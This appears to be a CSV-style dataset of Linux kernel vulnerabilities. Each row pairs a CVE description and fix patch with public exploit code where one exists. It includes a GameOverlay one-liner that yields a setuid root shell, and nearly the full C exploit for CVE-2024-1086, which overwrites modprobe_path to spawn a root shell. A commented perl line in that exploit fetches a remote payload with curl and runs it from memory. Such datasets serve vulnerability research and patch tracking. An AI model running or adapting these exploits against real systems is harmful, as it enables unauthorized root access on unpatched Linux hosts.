2.34.1",https://lists.ubuntu.com/archives/kernel-team/2023-July/140923.html,"unshare -rm sh -c ""mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;"" && u/python3 -c 'import os;os.setuid(0);os.system(""cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash"")'",https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/tree/main,,,
CVE-2023-35001,https://www.opencve.io/cve/CVE-2023-35001,Linux Kernel nftables Out-Of-Bounds Read/Write Vulnerability ； nft_byteorder poorly handled vm register contents when CAP_NET_ADMIN is in any user or network namespace,"When evaluating byteorder expressions with size 2, a union with 32-bit and
16-bit members is used. Since the 16-bit members are aligned to 32-bit,
the array accesses will be out-of-bounds. 

net/netfilter/nft_byteorder.c | 17 ++++++++++-------
 1 file changed, 10 insertions(+), 7 deletions(-)

diff --git a/net/netfilter/nft_byteorder.c b/net/netfilter/nft_byteorder.c
index 9a85e797ed58..aa16bd2e92e2 100644
--- a/net/netfilter/nft_byteorder.c
+++ b/net/netfilter/nft_byteorder.c
@@ -30,11 +30,14 @@ void nft_byteorder_eval(const struct nft_expr *expr,
 	const struct nft_byteorder *priv = nft_expr_priv(expr);
 	u32 *src = &regs->data[priv->sreg];
 	u32 *dst = &regs->data[priv->dreg];
-	union { u32 u32; u16 u16; } *s, *d;
+	u32 *s32, *d32;
+	u16 *s16, *d16;
 	unsigned int i;
 
-	s = (void *)src;
-	d = (void *)dst;
+	s32 = (void *)src;
+	d32 = (void *)dst;
+	s16 = (void *)src;
+	d16 = (void *)dst;
 
 	switch (priv->size) {
 	case 8: {
@@ -62,11 +65,11 @@ void nft_byteorder_eval(const struct nft_expr *expr,
 		switch (priv->op) {
 		case NFT_BYTEORDER_NTOH:
 			for (i = 0; i < priv->len / 4; i++)
-				d[i].u32 = ntohl((__force __be32)s[i].u32);
+				d32[i] = ntohl((__force __be32)s32[i]);
 			break;
 		case NFT_BYTEORDER_HTON:
 			for (i = 0; i < priv->len / 4; i++)
-				d[i].u32 = (__force __u32)htonl(s[i].u32);
+				d32[i] = (__force __u32)htonl(s32[i]);
 			break;
 		}
 		break;
@@ -74,11 +77,11 @@ void nft_byteorder_eval(const struct nft_expr *expr,
 		switch (priv->op) {
 		case NFT_BYTEORDER_NTOH:
 			for (i = 0; i < priv->len / 2; i++)
-				d[i].u16 = ntohs((__force __be16)s[i].u16);
+				d16[i] = ntohs((__force __be16)s16[i]);
 			break;
 		case NFT_BYTEORDER_HTON:
 			for (i = 0; i < priv->len / 2; i++)
-				d[i].u16 = (__force __u16)htons(s[i].u16);
+				d16[i] = (__force __u16)htons(s16[i]);
 			break;
 		}
 		break;
-- 
2.34.1",https://lore.kernel.org/netfilter-devel/20230705121515.747251-1-cascardo@canonical.com/T/,,,,,
CVE-2024-1086,https://www.opencve.io/cve/CVE-2024-1086,"A use-after-free vulnerability in the Linux kernel's netfilter: nf_tables component can be exploited to achieve local privilege escalation.

The nft_verdict_init() function allows positive values as drop error within the hook verdict, and hence the nf_hook_slow() function can cause a double free vulnerability when NF_DROP is issued with a drop error which resembles NF_ACCEPT.

We recommend upgrading past commit f342de4e2f33e0e39165d8639387aa6c19dff660.

","netfilter: nf_tables: reject QUEUE/DROP verdict parameters
This reverts commit e0abdadcc6e1.

core.c:nf_hook_slow assumes that the upper 16 bits of NF_DROP
verdicts contain a valid errno, i.e. -EPERM, -EHOSTUNREACH or similar,
or 0.

Due to the reverted commit, its possible to provide a positive
value, e.g. NF_ACCEPT (1), which results in use-after-free.

Its not clear to me why this commit was made.

NF_QUEUE is not used by nftables; ""queue"" rules in nftables
will result in use of ""nft_queue"" expression.

If we later need to allow specifiying errno values from userspace
(do not know why), this has to call NF_DROP_GETERR and check that
""err <= 0"" holds true.

Fixes: e0abdadcc6e1 (""netfilter: nf_tables: accept QUEUE/DROP verdict parameters"")
Cc: stable@vger.kernel.org
Reported-by: Notselwyn <notselwyn@pwning.tech>
Signed-off-by: Florian Westphal <fw@strlen.de>
Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
Diffstat
-rw-r--r--	net/netfilter/nf_tables_api.c	16	
1 files changed, 6 insertions, 10 deletions
diff --git a/net/netfilter/nf_tables_api.c b/net/netfilter/nf_tables_api.c
index 02f45424644b4d..c537104411e7d1 100644
--- a/net/netfilter/nf_tables_api.c
+++ b/net/netfilter/nf_tables_api.c
@@ -10992,16 +10992,10 @@ static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,
 	data->verdict.code = ntohl(nla_get_be32(tb[NFTA_VERDICT_CODE]));
 
 	switch (data->verdict.code) {
-	default:
-		switch (data->verdict.code & NF_VERDICT_MASK) {
-		case NF_ACCEPT:
-		case NF_DROP:
-		case NF_QUEUE:
-			break;
-		default:
-			return -EINVAL;
-		}
-		fallthrough;
+	case NF_ACCEPT:
+	case NF_DROP:
+	case NF_QUEUE:
+		break;
 	case NFT_CONTINUE:
 	case NFT_BREAK:
 	case NFT_RETURN:
@@ -11036,6 +11030,8 @@ static int nft_verdict_init(const struct nft_ctx *ctx, struct nft_data *data,
 
 		data->verdict.chain = chain;
 		break;
+	default:
+		return -EINVAL;
 	}
 
 	desc->len = sizeof(data->verdict);",https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f342de4e2f33e0e39165d8639387aa6c19dff660,"// This program, and the other programs and scripts (""programs"", ""these programs"") in this software directory/folder/repository (""repository"") are published, developed and distributed for educational/research purposes only. I (""the creator"") do not condone any malicious or illegal usage of these programs, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with these programs.

#define _GNU_SOURCE 1
#include <sched.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <string.h>
#include <fcntl.h>
#include <sys/xattr.h>
#include <errno.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include ""env.h""
#include ""net.h""
#include ""nftnl.h""
#include ""file.h""
#include ""config.h""
#include ""file.h""

static char intermed_buf[1 << 19];

static void send_ipv4_ip_hdr_chr(size_t dfsize, struct ip *ip_header, char chr)
{
	memset(intermed_buf, chr, dfsize);
	send_ipv4_ip_hdr(intermed_buf, dfsize, ip_header);
}

static void trigger_double_free_hdr(size_t dfsize, struct ip *ip_header)
{
	printf(""[*] sending double free buffer packet...\n"");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41');
}

static void alloc_intermed_buf_hdr(size_t dfsize, struct ip *ip_header)
{
	PRINTF_VERBOSE(""[*] sending intermediate buffer packet...\n"");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x00');
}

static void alloc_ipv4_udp(size_t content_size)
{
	PRINTF_VERBOSE(""[*] sending udp packet...\n"");
	memset(intermed_buf, '\x00', content_size);
	send_ipv4_udp(intermed_buf, content_size);
}

static void set_ipfrag_time(unsigned int seconds)
{
	int fd;
	
	fd = open(""/proc/sys/net/ipv4/ipfrag_time"", O_WRONLY);
	if (fd < 0) {
		perror(""open$ipfrag_time"");
		exit(1);
	}

	dprintf(fd, ""%u\n"", seconds);
	close(fd);
}

static void pin_cpu(int cpu_id) {
    cpu_set_t mask;

    CPU_ZERO(&mask); // clear the CPU set
    CPU_SET(cpu_id, &mask); // set the bit that represents CPU x

    if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
        perror(""sched_setaffinity"");
        exit(1); 
    } 
}

static void modprobe_trigger_memfd()
{
	int fd;
	char *argv_envp = NULL;

	fd = memfd_create("""", MFD_CLOEXEC);
	write(fd, ""\xff\xff\xff\xff"", 4);

	fexecve(fd, &argv_envp, &argv_envp);
	
	close(fd);
}

#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1
#define EXPLOIT_STAT_RUNNING 0
#define EXPLOIT_STAT_FINISHED 3

#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }

// presumably needs to be CPU pinned
static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	
	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;
		PRINTF_VERBOSE(""[*] flush tlb thread gonna sleep\n"");
		sleep(9999);
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
}

#define MEMCPY_HOST_FD_PATH(buf, pid, fd) sprintf((buf), ""/proc/%u/fd/%u"", (pid), (fd));

static int is_kernel_base(unsigned char *addr)
{
	// thanks python
	
	// get-sig kernel_runtime_1
	if (memcmp(addr + 0x0, ""\x48\x8d\x25\x51\x3f"", 5) == 0 &&
			memcmp(addr + 0x7, ""\x48\x8d\x3d\xf2\xff\xff\xff"", 7) == 0)
		return 1;

	// get-sig kernel_runtime_2
	if (memcmp(addr + 0x0, ""\xfc\x0f\x01\x15"", 4) == 0 &&
			memcmp(addr + 0x8, ""\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf"", 12) == 0 &&
			memcmp(addr + 0x18, ""\x89\xde\x8b\x0d"", 4) == 0 &&
			memcmp(addr + 0x20, ""\xc1\xe9\x02\xf3\xa5\xbc"", 6) == 0 &&
			memcmp(addr + 0x2a, ""\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00"", 24) == 0 &&
			memcmp(addr + 0x45, ""\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00"", 15) == 0 &&
			memcmp(addr + 0x55, ""\x08\x00\xb9\x01\x01\x00\xc0\xb8"", 8) == 0 &&
			memcmp(addr + 0x61, ""\x31\xd2\x0f\x30\xe8"", 5) == 0 &&
			memcmp(addr + 0x6a, ""\x48\xc7\xc6"", 3) == 0 &&
			memcmp(addr + 0x71, ""\x48\xc7\xc0\x80\x00\x00"", 6) == 0 &&
			memcmp(addr + 0x78, ""\xff\xe0"", 2) == 0)
		return 1;


	return 0;
}

static void busy_msleep(int target_ms)
{
    struct timeval start, end;
	long elapsed_ms;
	
    gettimeofday(&start, NULL);

LAB_POLL_TIME:
    gettimeofday(&end, NULL);
    elapsed_ms = ((end.tv_sec - start.tv_sec) * 1000 + (end.tv_usec - start.tv_usec)/1000.0) + 0.5;
	if (elapsed_ms < target_ms)
		goto LAB_POLL_TIME;
}

#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
	_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))

static int get_modprobe_path(char *buf, size_t buflen)
{
	int size;

	size = read_file(""/proc/sys/kernel/modprobe"", buf, buflen);

	if (size == buflen)
		printf(""[*] ==== read max amount of modprobe_path bytes, perhaps increment KMOD_PATH_LEN? ====\n"");

	// remove \x0a
	buf[size-1] = '\x00';

	return size;
}

static int strcmp_modprobe_path(char *new_str)
{
	char buf[KMOD_PATH_LEN] = { '\x00' };

	get_modprobe_path(buf, KMOD_PATH_LEN);
	
	return strncmp(new_str, buf, KMOD_PATH_LEN);
}

static void breached_the_mainframe()
{
	printf(""\n==== INITIATING MAINFRAME BREACH PROTOCOL ====\n"");
	printf(""[*] going to inject sql payload into the external mainframe smart contract interface...\n"");
	busy_msleep(100);
	printf(""[*] dumping runtime core memory of the root smart contract..\n"");
	busy_msleep(400);
	printf(""[+] detected unix system\n"");
	printf(""[*] extracting credentials from the mainframe...\n"");
	busy_msleep(200);
	printf(""[*] sending network-based smb hypertrojan with credentials...\n"");
	busy_msleep(300);
	printf(""[*] executing xss local file write to hijack systemd user...\n"");
	busy_msleep(200);
	printf(""[+] hacked the exterior layer of the datacenter mainframe\n"");
	printf(""[*] going to escalate the quantum privilege of wifi driver...\n"");
	busy_msleep(100);
	printf(""[+] achieved target: breached the mainframe\n"");
}

void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modprobe_path_str, size_t modprobe_path_len)
{
	void *pmd_modprobe_addr;

	// search 0x200000 bytes (a full PTE at a time) for the modprobe_path signature
	pmd_modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str, modprobe_path_len);
	if (pmd_modprobe_addr == NULL)
		return NULL;

	// check if this is the actual modprobe by overwriting it, and checking /proc/sys/kernel/modprobe
	strcpy(pmd_modprobe_addr, ""/sanitycheck"");
	if (strcmp_modprobe_path(""/sanitycheck"") != 0)
	{
		printf(""[-] ^false positive. skipping to next one\n"");
		return NULL;
	}

	return pmd_modprobe_addr;
}

static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
	unsigned long long *pte_area;
	void *_pmd_area;
	void *pmd_kernel_area;
	void *pmd_data_area;
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD, 
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 70,
		.ip_src.s_addr = inet_addr(""1.1.1.1""),
		.ip_dst.s_addr = inet_addr(""255.255.255.255""),
	};
	char modprobe_path[KMOD_PATH_LEN] = { '\x00' };

	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);

	printf(""[+] running normal privesc\n"");

    PRINTF_VERBOSE(""[*] doing first useless allocs to setup caching and stuff...\n"");

	pin_cpu(0);

	// allocate PUD (and a PMD+PTE) for PMD
	mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(unsigned long long*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xDEADBEEF;

	// pre-register sprayed PTEs, with 0x1000 * 2, so 2 PTEs fit inside when overlapping with PMD
	// needs to be minimal since VMA registration costs memory
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		void *retv = mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);

		if (retv == MAP_FAILED)
		{
			perror(""mmap"");
			exit(EXIT_FAILURE);
		}
	}

	// pre-allocate PMDs for sprayed PTEs
	// PTE_SPRAY_AMOUNT / 512 = PMD_SPRAY_AMOUNT: PMD contains 512 PTE children
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x41;
	
	// these use different PTEs but the same PMD
	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pmd_kernel_area = _pmd_area;
	pmd_data_area = _pmd_area + 0x200000;

	PRINTF_VERBOSE(""[*] allocated VMAs for process:\n  - pte_area: ?\n  - _pmd_area: %p\n  - modprobe_path: '%s' @ %p\n"", _pmd_area, modprobe_path, modprobe_path);

	populate_sockets();

	set_ipfrag_time(1);

	// cause socket/networking-related objects to be allocated
	df_ip_header.ip_id = 0x1336;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 8 + 4000;
	df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000);
	alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);

	set_ipfrag_time(9999);

	printf(""[*] waiting for the calm before the storm...\n"");
	sleep(CONFIG_SEC_BEFORE_STORM);

	// pop N skbs from skb freelist
	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		PRINTF_VERBOSE(""[*] reserving udp packets... (%d/%d)\n"", i, CONFIG_SKB_SPRAY_AMOUNT);
		alloc_ipv4_udp(1);
	}

	// allocate and free 1 skb from freelist
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
	trigger_double_free_hdr(32768 + 8, &df_ip_header);
	
	// push N skbs to skb freelist
	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		PRINTF_VERBOSE(""[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n"", i, CONFIG_SKB_SPRAY_AMOUNT);
		recv_ipv4_udp(1);
	}

	// spray-allocate the PTEs from PCP allocator order-0 list
	printf(""[*] spraying %d pte's...\n"", CONFIG_PTE_SPRAY_AMOUNT);
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;

	PRINTF_VERBOSE(""[*] double-freeing skb...\n"");

	// cause double-free on skb from earlier
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
	df_ip_header.ip_off = ntohs(((32768 + 8) >> 3) | 0x2000);
	
	// skb1->len gets overwritten by s->random() in set_freepointer(). need to discard queue with tricks circumventing skb1->len
	// causes end == offset in ip_frag_queue(). packet will be empty
	// remains running until after both frees, a.k.a. does not require sleep
	alloc_intermed_buf_hdr(0, &df_ip_header);

	// allocate overlapping PMD page (overlaps with PTE)
	*(unsigned long long*)_pmd_area = 0xCAFEBABE;

	printf(""[*] checking %d sprayed pte's for overlap...\n"", CONFIG_PTE_SPRAY_AMOUNT);

	// find overlapped PTE area
	pte_area = NULL;
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);

		// pte entry pte[0] should be the PFN+flags for &_pmd_area
		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
		if (*test_target_addr != 0x41)
		{
			printf(""[+] confirmed double alloc PMD/PTE\n"");
			PRINTF_VERBOSE(""    - PTE area index: %lld\n"", i);
			PRINTF_VERBOSE(""    - PTE area (write target address/page): %016llx (new)\n"", *test_target_addr);
			pte_area = test_target_addr;
		}
	}

	if (pte_area == NULL)
	{
		printf(""[-] failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx\n"", *(unsigned long long*)_pmd_area);

		return;
	}
	
	// set new pte value for sanity check
	*pte_area = 0x0 | 0x8000000000000867;

	flush_tlb(_pmd_area, 0x400000);
	PRINTF_VERBOSE(""    - PMD area (read target value/page): %016llx (new)\n"", *(unsigned long long*)_pmd_area);

	// run this script instead of /sbin/modprobe
	int modprobe_script_fd = memfd_create("""", MFD_CLOEXEC);
	int status_fd = memfd_create("""", 0);
	
	// range = (k * j) * CONFIG_PHYSICAL_ALIGN
	// scan 512 pages (1 PTE worth) for kernel base each iteration
	for (int k=0; k < (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		unsigned long long kernel_iteration_base;

		kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * 512);

		PRINTF_VERBOSE(""[*] setting kernel physical address range to 0x%016llx - 0x%016llx\n"", kernel_iteration_base, kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * 512);
		for (unsigned short j=0; j < 512; j++)
			pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | 0x8000000000000867;

		flush_tlb(_pmd_area, 0x400000);

		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
		for (unsigned long long j=0; j < 512; j++) 
		{
			unsigned long long phys_kernel_base;
		
			// check for x64-gcc/clang signatures of kernel code segment at rest and at runtime
			// - this ""kernel base"" is actually the assembly bytecode of start_64() and variants
			// - it's different per architecture and per compiler (clang produces different signature than gcc)
			// - this can be derived from the vmlinux file by checking the second segment, which starts likely at binary offset 0x200000
			//   - i.e: xxd ./vmlinux | grep '00200000:'
			
			phys_kernel_base = kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j;

			PRINTF_VERBOSE(""[*] phys kernel addr: %016llx, val: %016llx\n"", phys_kernel_base, *(unsigned long long*)(pmd_kernel_area + j * 0x1000));

			if (is_kernel_base(pmd_kernel_area + j * 0x1000) == 0)
				continue;

			printf(""[+] found possible physical kernel base: %016llx\n"", phys_kernel_base);
			
			// scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from kernel base for modprobe path. if not found, just search for another kernel base
			for (int i=0; i < 40; i++) 
			{
				void *pmd_modprobe_addr;
				unsigned long long phys_modprobe_addr;
				unsigned long long modprobe_iteration_base;

				modprobe_iteration_base = phys_kernel_base + i * 0x200000;

				PRINTF_VERBOSE(""[*] setting physical address range to 0x%016llx - 0x%016llx\n"", modprobe_iteration_base, modprobe_iteration_base + 0x200000);

				// set the pages for the other threads PUD data range to kernel memory
				for (unsigned short j=0; j < 512; j++)
					pte_area[512 + j] = (modprobe_iteration_base + 0x1000 * j) | 0x8000000000000867;

				flush_tlb(_pmd_area, 0x400000);
				
#if CONFIG_STATIC_USERMODEHELPER
				pmd_modprobe_addr = memmem(pmd_data_area, 0x200000, CONFIG_STATIC_USERMODEHELPER_PATH, strlen(CONFIG_STATIC_USERMODEHELPER_PATH));
#else
				pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x200000, modprobe_path, KMOD_PATH_LEN);
#endif
				if (pmd_modprobe_addr == NULL)
					continue;

#if CONFIG_LEET
				breached_the_mainframe();
#endif

				phys_modprobe_addr = modprobe_iteration_base + (pmd_modprobe_addr - pmd_data_area);
				printf(""[+] verified modprobe_path/usermodehelper_path: %016llx ('%s')...\n"", phys_modprobe_addr, (char*)pmd_modprobe_addr);

				PRINTF_VERBOSE(""[*] modprobe_script_fd: %d, status_fd: %d\n"", modprobe_script_fd, status_fd);
				
				printf(""[*] overwriting path with PIDs in range 0->4194304...\n"");
				for (pid_t pid_guess=0; pid_guess < 4194304; pid_guess++)
				{
					int status_cnt;
					char buf;

					// overwrite the `modprobe_path` kernel variable to ""/proc/<pid>/fd/<script_fd>""
					// - use /proc/<pid>/* since container path may differ, may not be accessible, et cetera
					// - it must be root namespace PIDs, and can't get the root ns pid from within other namespace
					MEMCPY_HOST_FD_PATH(pmd_modprobe_addr, pid_guess, modprobe_script_fd);

					if (pid_guess % 50 == 0)
					{
						PRINTF_VERBOSE(""[+] overwriting modprobe_path with different PIDs (%u-%u)...\n"", pid_guess, pid_guess + 50);
						PRINTF_VERBOSE(""    - i.e. '%s' @ %p...\n"", (char*)pmd_modprobe_addr, pmd_modprobe_addr);
						PRINTF_VERBOSE(""    - matching modprobe_path scan var: '%s' @ %p)...\n"", modprobe_path, modprobe_path);
					}
						
					lseek(modprobe_script_fd, 0, SEEK_SET); // overwrite previous entry
					dprintf(modprobe_script_fd, ""#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n"", pid_guess, status_fd, pid_guess, shell_stdin_fd, pid_guess, shell_stdout_fd);

					// run custom modprobe file as root, by triggering it by executing file with unknown binfmt
					// if the PID is incorrect, nothing will happen
					modprobe_trigger_memfd();

					// indicates correct PID (and root shell). stops further bruteforcing
					status_cnt = read(status_fd, &buf, 1);
					if (status_cnt == 0)
						continue;

					printf(""[+] successfully breached the mainframe as real-PID %u\n"", pid_guess);

					return;
				}

				printf(""[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n"");

				return;
			}
			
			printf(""[-] failed to find correct modprobe_path: trying to find new kernel base...\n"");
		}
	}

	printf(""[!] failed to find kernel code segment... CONFIG_STATIC_USERMODEHELPER disabled?\n"");
	return;
}

/*
perl -e '
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  open(my $fh, "">&="".$fd);
  print $fh `curl http://172.23.0.1:1337/main -s`;
  exec {""/proc/$$/fd/$fd""} ""memfd"";
'
*/

void signal_handler_sleep(int sig)
{
	printf(""[*] handling ctrl-c by sleeping background thread\n"");
	printf(""!! >> if you did this while in the root shell, the terminal will be messed up << !!\n"");
	sleep(9999);
}

int main()
{
	int *exploit_status;

	exploit_status = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*exploit_status = EXPLOIT_STAT_RUNNING;

	// detaches program and makes it sleep in background when succeeding or failing
	// - prevents kernel system instability when trying to free resources
	if (fork() == 0)
	{
		int shell_stdin_fd;
		int shell_stdout_fd;

		signal(SIGINT, signal_handler_sleep);

		// open copies of stdout etc which will not be redirected when stdout is redirected, but will be printed to user
		shell_stdin_fd = dup(STDIN_FILENO);
		shell_stdout_fd = dup(STDOUT_FILENO);

#if CONFIG_REDIRECT_LOG
		setup_log(""exp.log"");
#endif

		setup_env();
 
		privesc_flh_bypass_no_time(shell_stdin_fd, shell_stdout_fd);

		*exploit_status = EXPLOIT_STAT_FINISHED;

		// prevent crashes due to invalid pagetables
		sleep(9999);
	}

	// prevent premature exits
	SPINLOCK(*exploit_status == EXPLOIT_STAT_RUNNING);

	return 0;
}

",https://github.com/Notselwyn/CVE-2024-1086/tree/main,"Netfilter是Linux内核中的一个数据包处理模块，它可以提供数据包的过滤、转发、地址转换NAT功能。
2024年3月28日，监测到 Linux kernel权限提升漏洞（CVE-2024-1086）的PoC/EXP在互联网上公开，该漏洞的CVSS评分为7.8，目前漏洞细节已经公开披露。
Linux内核版本v5.14 – v6.6的netfilter 子系统nf_tables组件中存在释放后使用漏洞，由于在nft_verdict_init（）函数中，允许正值作为hook判决中的丢弃错误，因此当NF_DROP发出类似于NF_ACCEPT的丢弃错误时，nf_hook_slow（）函数可能会导致双重释放漏洞，本地低权限威胁者可利用该漏洞将权限提升为root。",http://www.mianhuage.com/2021.html,
CVE-2023-3269,https://www.opencve.io/cve/CVE-2023-3269,"A vulnerability exists in the memory management subsystem of the Linux kernel. The lock handling for accessing and updating virtual memory areas (VMAs) is incorrect, leading to use-after-free problems. This issue can be successfully exploited to execute arbitrary kernel code, escalate containers, and gain root privileges.","Merge branch 'expand-stack'
This modifies our user mode stack expansion code to always take the
mmap_lock for writing before modifying the VM layout.

It's actually something we always technically should have done, but
because we didn't strictly need it, we were being lazy (""opportunistic""
sounds so much better, doesn't it?) about things, and had this hack in
place where we would extend the stack vma in-place without doing the
proper locking.

And it worked fine.  We just needed to change vm_start (or, in the case
of grow-up stacks, vm_end) and together with some special ad-hoc locking
using the anon_vma lock and the mm->page_table_lock, it all was fairly
straightforward.

That is, it was all fine until Ruihan Li pointed out that now that the
vma layout uses the maple tree code, we *really* don't just change
vm_start and vm_end any more, and the locking really is broken.  Oops.

It's not actually all _that_ horrible to fix this once and for all, and
do proper locking, but it's a bit painful.  We have basically three
different cases of stack expansion, and they all work just a bit
differently:

 - the common and obvious case is the page fault handling. It's actually
   fairly simple and straightforward, except for the fact that we have
   something like 24 different versions of it, and you end up in a maze
   of twisty little passages, all alike.

 - the simplest case is the execve() code that creates a new stack.
   There are no real locking concerns because it's all in a private new
   VM that hasn't been exposed to anybody, but lockdep still can end up
   unhappy if you get it wrong.

 - and finally, we have GUP and page pinning, which shouldn't really be
   expanding the stack in the first place, but in addition to execve()
   we also use it for ptrace(). And debuggers do want to possibly access
   memory under the stack pointer and thus need to be able to expand the
   stack as a special case.

None of these cases are exactly complicated, but the page fault case in
particular is just repeated slightly differently many many times.  And
ia64 in particular has a fairly complicated situation where you can have
both a regular grow-down stack _and_ a special grow-up stack for the
register backing store.

So to make this slightly more manageable, the bulk of this series is to
first create a helper function for the most common page fault case, and
convert all the straightforward architectures to it.

Thus the new 'lock_mm_and_find_vma()' helper function, which ends up
being used by x86, arm, powerpc, mips, riscv, alpha, arc, csky, hexagon,
loongarch, nios2, sh, sparc32, and xtensa.  So we not only convert more
than half the architectures, we now have more shared code and avoid some
of those twisty little passages.

And largely due to this common helper function, the full diffstat of
this series ends up deleting more lines than it adds.

That still leaves eight architectures (ia64, m68k, microblaze, openrisc,
parisc, s390, sparc64 and um) that end up doing 'expand_stack()'
manually because they are doing something slightly different from the
normal pattern.  Along with the couple of special cases in execve() and
GUP.

So there's a couple of patches that first create 'locked' helper
versions of the stack expansion functions, so that there's a obvious
path forward in the conversion.  The execve() case is then actually
pretty simple, and is a nice cleanup from our old ""grow-up stackls are
special, because at execve time even they grow down"".

The #ifdef CONFIG_STACK_GROWSUP in that code just goes away, because
it's just more straightforward to write out the stack expansion there
manually, instead od having get_user_pages_remote() do it for us in some
situations but not others and have to worry about locking rules for GUP.

And the final step is then to just convert the remaining odd cases to a
new world order where 'expand_stack()' is called with the mmap_lock held
for reading, but where it might drop it and upgrade it to a write, only
to return with it held for reading (in the success case) or with it
completely dropped (in the failure case).

In the process, we remove all the stack expansion from GUP (where
dropping the lock wouldn't be ok without special rules anyway), and add
it in manually to __access_remote_vm() for ptrace().

Thanks to Adrian Glaubitz and Frank Scheiner who tested the ia64 cases.
Everything else here felt pretty straightforward, but the ia64 rules for
stack expansion are really quite odd and very different from everything
else.  Also thanks to Vegard Nossum who caught me getting one of those
odd conditions entirely the wrong way around.

